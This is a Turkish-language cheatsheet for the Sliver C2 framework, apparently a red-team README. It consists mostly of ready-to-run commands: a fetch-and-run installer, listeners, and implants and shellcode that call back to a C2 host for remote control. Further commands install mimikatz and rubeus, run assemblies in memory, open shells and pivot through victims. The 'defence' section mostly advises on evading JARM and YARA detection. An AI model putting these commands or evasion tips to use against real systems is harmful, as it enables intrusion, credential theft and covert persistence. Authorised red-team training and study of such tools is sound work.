# ⚔️ Sliver C2 - Kapsamlı Başvuru Rehberi (Cheatsheet)

[🇺🇸 English Version](../README.md)

```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║╚════██║██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
      Bishop Fox Tarafından Geliştirilen Modern Açık Kaynak C2 Çerçevesi
```

<p align="center">
  <img src="https://img.shields.io/badge/Sliver-C2_Platformu-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Geliştirici-Bishop_Fox-orange?style=for-the-badge" alt="Bishop Fox">
  <img src="https://img.shields.io/badge/Dil-Go-cyan?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Kategori-C2_&_Red_Team-red?style=for-the-badge" alt="Red Team">
</p>

<p align="center">
  <b>⚔️ mTLS, WireGuard, HTTP(S) ve DNS protokollerini destekleyen modern, çapraz platformlu, açık kaynaklı tehdit simülasyonu ve Komuta Kontrol (C2) çerçevesi</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış ve Mimari](#-genel-bakış-ve-mimari)
- [Kurulum ve Sunucu Yapılandırması](#-kurulum-ve-sunucu-yapılandırması)
  - [Tek Satırda Otomatik Kurulum](#tek-satırda-otomatik-kurulum)
  - [Çoklu Operatör (Multiplayer) Ayarları](#çoklu-operatör-multiplayer-ayarları)
- [Dinleyici (Listener) Yapılandırması (mTLS, HTTP, WireGuard, DNS)](#-dinleyici-listener-yapılandırması-mtls-http-wireguard-dns)
- [İmplant Üretimi (Beacon ve Session Karşılaştırması)](#-implant-üretimi-beacon-ve-session-karşılaştırması)
  - [Etkileşimli Session ve Asenkron Beacon Farkı](#etkileşimli-session-ve-asenkron-beacon-farkı)
  - [Windows EXE ve Shellcode İmplantları](#windows-exe-ve-shellcode-implantları)
  - [Linux ve macOS ELF İmplantları](#linux-ve-macos-elf-implantları)
- [İstismar Sonrası (Post-Exploitation) ve Armory Ekosistemi](#-istismar-sonrası-post-exploitation-ve-armory-ekosistemi)
  - [Armory Paketlerini Yükleme (BOFs, Donut, Seatbelt)](#armory-paketlerini-yükleme-bofs-donut-seatbelt)
  - [Oturum Yönetimi ve Bellek İçi .NET Çalıştırma](#oturum-yönetimi-ve-bellek-içi-net-çalıştırma)
  - [Pivotlama ve Dinamik SOCKS5](#pivotlama-ve-dinamik-socks5)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Yöntemleri ve Tespit](#-savunma-yöntemleri-ve-tespit)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış ve Mimari

**Bishop Fox** tarafından Go diliyle geliştirilen **Sliver**, ticari C2 platformlarına (Cobalt Strike, Brute Ratel) en güçlü açık kaynak alternatiflerden biridir:
- **Çapraz Platform:** Sunucu ve implantlar Windows, Linux ve macOS (`x86_64`, `arm64`) üzerinde çalışır.
- **Güvenli İletişim Kanalları:** Karşılıklı TLS (mTLS), WireGuard UDP tünelleri, Let's Encrypt destekli HTTPS ve DNS tünelleme modları.
- **Bellek İçi Çalıştırma (In-Memory):** Reflektif DLL enjeksiyonu, Cobalt Strike Beacon Object Files (BOFs), Donut ile disk temassız .NET çalıştırma.
- **Çoklu Operatör Desteği:** Şifrelenmiş profillerle birden fazla red team operatörünün aynı C2 sunucusunu eşzamanlı yönetebilmesi.

---

## 📥 Kurulum ve Sunucu Yapılandırması

### Tek Satırda Otomatik Kurulum
```bash
# Sliver sunucu ve istemcisini otomatik kurma
curl -s https://sliver.sh/install | sudo bash

# Sliver arka plan servisini başlatma
sudo systemctl enable --now sliver
```

### Çoklu Operatör (Multiplayer) Ayarları
Takım arkadaşı için C2 operatör profili oluşturma:
```bash
# C2 sunucusunda çalıştırılır
sliver-server operator --name cihan --lhost 192.168.1.100 --save /tmp/cihan.sliver

# Operatör kendi makinesinde içe aktarır
sliver-client import /path/to/cihan.sliver
sliver-client
```

---

## 🎧 Dinleyici (Listener) Yapılandırması (mTLS, HTTP, WireGuard, DNS)

`sliver` konsolu içinde:

```text
# 8888 portunda mTLS dinleyicisi başlatma
[sliver] > mtls --lport 8888

# 443 portunda otomatik SSL sertifikalı HTTPS dinleyici başlatma
[sliver] > https --lport 443 --domain c2.example.com

# 53/UDP portunda WireGuard dinleyicisi başlatma
[sliver] > wg --lport 53

# Aktif dinleyicileri görüntüleme
[sliver] > jobs
```

---

## 🚀 İmplant Üretimi (Beacon ve Session Karşılaştırması)

### Etkileşimli Session ve Asenkron Beacon Farkı
- **Session:** Gerçek zamanlı açık TCP/TLS bağlantısıdır. Komutlar anında yürütülür ancak sürekli açık ağ bağlantısı SOC analizinde dikkat çeker.
- **Beacon:** Belirli aralıklarla (sleep) rastgele gecikmelerle (jitter) sinyal gönderen asenkron modeldir. EDR ve ağ anomalisi tespitini atlatmada son derece etkilidir.

### Windows EXE ve Shellcode İmplantları
```text
# Windows x64 etkileşimli mTLS session implantı üretme
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# 60 saniye sleep ve %20 jitter ile gizli HTTPS beacon implantı üretme
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Pozisyondan bağımsız x64 ham shellcode üretme
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```

### Linux ve macOS ELF İmplantları
```text
# Linux x64 ELF ikili dosyası
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```

---

## 🛠️ İstismar Sonrası (Post-Exploitation) ve Armory Ekosistemi

### Armory Paketlerini Yükleme (BOFs, Donut, Seatbelt)
Armory, üçüncü parti araçları ve Cobalt Strike BOF uzantılarını Sliver içerisine entegre eden paket yöneticisidir:
```text
# Paket listesini güncelleme
[sliver] > armory update

# Popüler istismar araçlarını yükleme
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```

### Oturum Yönetimi ve Bellek İçi .NET Çalıştırma
```text
# Aktif oturumları listeleme
[sliver] > sessions

# Oturuma geçiş yapma
[sliver] > use <OTURUM_ID>

# Ekran görüntüsü alma
[sliver] (session) > screenshot

# Etkileşimli terminal açma
[sliver] (session) > shell

# Diske dokunmadan bellekte .NET derlemesi çalıştırma
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```

### Pivotlama ve Dinamik SOCKS5
Saldırgan araçlarını kurban makine üzerinden iç ağa yönlendirme:
```text
# İstemci makinede 1080 portunda SOCKS5 proxy başlatma
[sliver] (session) > socks5 start --port 1080

# Aktif pivot tünellerini listeleme
[sliver] > pivots
```

---

## ⚡ Hızlı Referans Tablosu

| Amaç | Komut |
|------|-------|
| **mTLS Dinleyici Başlat** | `mtls --lport 8888` |
| **HTTPS Dinleyici Başlat**| `https --lport 443 --domain c2.domain.com` |
| **Session EXE Üret** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **Beacon EXE Üret** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **Ham Shellcode Üret** | `generate --mtls <IP>:8888 -f shellcode` |
| **Oturumları Listele/Seç**| `sessions` -> `use <ID>` |
| **Armory Araçlarını Kur** | `armory install seatbelt mimikatz` |
| **Bellekte .NET Çalıştır**| `execute-assembly /path/to/binary.exe <parametreler>` |
| **SOCKS5 Tüneli Aç** | `socks5 start --port 1080` |

---

## 🛡️ Savunma Yöntemleri ve Tespit

1. **JARM Parmak İzi:** Varsayılan Sliver HTTPS dinleyicileri JARM parmak izi analizi ile tespit edilebilir. Sliver yapılandırmasında TLS şifreleme paketlerini özelleştirin.
2. **YARA ve Bellek Tespiti:** Obfuscation uygulanmamış varsayılan Go implantları standart sembol tabloları içerir (`--skip-symbols` veya garble kullanımı önerilir).

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> Sliver C2 gelişmiş bir saldırı simülasyonu ve kırmızı takım platformudur. Yalnızca yasal izin alınmış ve kuralları belirlenmiş (RoE) testlerde kullanılmalıdır. İzniniz olmayan sistemlerde implant çalıştırmak suçtur.
